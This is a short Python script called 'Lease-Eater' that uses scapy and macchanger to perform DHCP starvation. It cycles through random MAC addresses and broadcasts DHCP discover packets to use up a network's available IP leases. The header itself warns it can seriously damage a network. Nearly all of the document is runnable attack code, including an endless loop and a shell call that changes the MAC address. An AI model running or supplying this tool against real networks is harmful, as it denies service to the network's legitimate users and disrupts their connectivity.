#!/usr/bin/env python

#Lease-Eater
#Purpose: To generate random MAC addresses and feed them into a DHCP request in an aptempt to eat up all aviable IP addresses.
#Version: 1.0
#By: Michael Contino
#Contact: @sleventyeleven

#WARNING: This tool can do some serious damage to a network!
#Use at your own risk.

#Requires:
#Python-scapy (thrid party python)
#macchanger (system level)

#Import required stuff
from scapy.all import *
import os

#set fix to get addtional infromation and multiple responses
conf.checkIPaddr = False

#get current mac address
fam,hw = get_if_raw_hwaddr(conf.iface)

#craft a DHCP discover Packet to find all DHCP servers
p=Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type","discover"),"end"])

#catch an responses in 30 seconds
ans, unans = srp(p, multi=True, timeout=30)

print "The server that were found are"
#start the loop to parse any caught answers
for a in ans:
    #display the Mac and IP address of 
    print a[1][Ether].src, a[1][IP].src

#while an answer is recived continue
while ans is not None:
    
    #use macchanger local packet for mac change management
    os.system("macchanger -e eth0")
    
    #set new mac address for scapy witch craft
    fam,hw = get_if_raw_hwaddr(conf.iface)
  
    #craft the standard DHCP packet
    p=Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type","discover"),"end"])
    
    #get all responses in 10 seconds
    ans, unans = srp(p, multi=True, timeout=10)
    
    print "The captured leases are"
    #display the consumed IP address  and the MAC address used
    for a in ans:
        print a[1][Ether].dst, a[1][BOOTP].yiaddr
